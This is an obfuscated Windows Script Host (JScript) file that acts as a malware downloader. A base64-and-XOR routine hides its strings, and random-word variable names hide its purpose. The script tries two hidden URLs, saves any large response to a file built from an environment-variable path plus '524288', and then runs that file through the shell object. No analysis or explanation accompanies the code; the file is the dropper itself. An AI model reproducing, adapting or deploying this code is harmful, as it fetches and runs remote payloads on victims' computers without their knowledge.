var decode = function (packedText) {
    var cipher ="qqHFjqc7j7RGdcF4";

    var Base64 = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        decode: function (input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = Base64._utf8_decode(output);

            return output;

        },
        _utf8_decode: function (utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                }
                else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                }
                else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }
            return string;
        }
    };

    var text = Base64.decode(packedText);

    var cipherLength = cipher.length;
    var result = "";
    for (var i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ cipher.charCodeAt(i % cipherLength));
    }
    return result;
};
(function() {
    var embossgb3 = 200;
    var inscrutablenUH = decode('"NjQc"');
    var bemuseL7s = decode('"NAktJQ=="');
    var tidene7 = decode('"JiIrNAMBFxk5XzcrCA=="');
    var pillagewGJ = decode('"PCIQCyZDTW8nexoTMDM="');
    var sanctionnhF = decode('"MDUHAig="');
    var meanderOvc = decode('"IgU6Iwsc"');
    var avariceNPE = decode('"VCUNCzpUPw=="');
    var interpolatetBo = decode('"XxQwIw=="');
    var tourO7Q = 2e5;
    var assertemd = [ decode('"GQU8NlBeTF8PWz4oEww0WBUAOTdEEgxaRQ9iaQEbIw=="'), decode('"GQU8NlBeTEAeUTs0AwwvWhYZLTQPFwUZCVg/aFxTaFEJFA=="') ];
    var palatialtE6 = 524288;
    var skilltMp = WScript.CreateObject(tidene7);
    var premiseRpH = WScript.CreateObject(pillagewGJ);
    var upbraidCUo = WScript.CreateObject(sanctionnhF + decode('"Xw=="') + meanderOvc);
    var grislydDD = skilltMp.ExpandEnvironmentStrings(avariceNPE);
    var buxomn9y = grislydDD + palatialtE6 + interpolatetBo;
    var trothGiW = false;
    for (var trothues = 0; trothues < assertemd.length; trothues++) {
        try {
            var volubleLHP = assertemd[trothues];
            premiseRpH.open(inscrutablenUH, volubleLHP, false);
            premiseRpH.send();
            if (premiseRpH.status == embossgb3) {
                try {
                    upbraidCUo.open();
                    upbraidCUo.type = 1;
                    upbraidCUo.write(premiseRpH.responseBody);
                    if (upbraidCUo.size > tourO7Q) {
                        trothues = assertemd.length;
                        upbraidCUo.position = 0;
                        upbraidCUo.saveToFile(buxomn9y, 2);
                        trothGiW = true;
                    }
                } finally {
                    upbraidCUo.close();
                }
            }
        } catch (ignored) {}
    }
    if (trothGiW) {
        skilltMp[bemuseL7s](grislydDD + Math.pow(2, 19));
    }
})();